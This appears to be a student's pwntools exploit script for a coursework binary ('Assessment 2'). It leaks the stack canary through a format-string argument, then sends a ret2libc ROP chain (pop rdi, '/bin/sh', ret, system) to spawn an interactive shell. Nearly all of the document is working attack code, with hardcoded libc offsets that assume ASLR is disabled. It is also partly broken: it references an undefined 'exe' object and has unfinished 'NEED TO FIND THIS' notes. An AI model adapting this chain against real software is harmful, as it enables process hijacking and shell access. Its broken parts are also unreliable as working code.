# Python program to exploit vuln.c for Assessment 2

#!/usr/bin/python3

from pwn import *

p = process('./vuln') 

program = ELF('./vuln')
context.binary = program
rop = ROP(program) 

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(b"Password:") 

libc.address = 0x00007ffff7dc4000 # Libc base address on my system without ASLR.
poprdi = libc.address + 0x0000000000028215 # using ROPgadget - need RDI as it is first register needed in 64bit.
ret = libc.address + 0x000000000002668c # using ROPgadget
system = libc.address + 0x000000000004dab0 # using 'readelf'
binsh = libc.address + 0x0000000000197e34 # using 'strings'

# Stack Canary Bypass
io = process([exe.path , "%33$llx"])   # NEED TO FIND THIS
canary = int(io.readline().strip(),16)

#rop.raw(b"A"*72)  # trigger the buffer overflow
rop.raw(b"A"*64)  # filling buffer only due to Canary
rop.raw(canary)
rop.raw(b"B"*8)  # Overflowing buffer (FIND NAME - RBP, RIP etc?)

#Rest of exploit as before

#rop.raw(pack("<I",0xdeadbeef)) # RIP test
rop.raw(poprdi) # pop rdi
rop.raw(binsh)
#rop.raw(next(libc.search(b'/bin/sh')))  # ROPgadget - search for the string /bin/sh
rop.raw(ret)  # ret from libc
rop.raw(system)
#rop.raw(libc.symbols['system']) # ROPgadget - find the 'system' symbol

# Generate the ROP chain
rop_chain = rop.chain()

# Write the ROP chain to a file - to use with debugger
with open('rop_chain.txt', 'wb') as f:
    f.write(rop_chain)

p.sendline(rop_chain) # Send the exploit to ./vuln
p.interactive() # Begin interactive session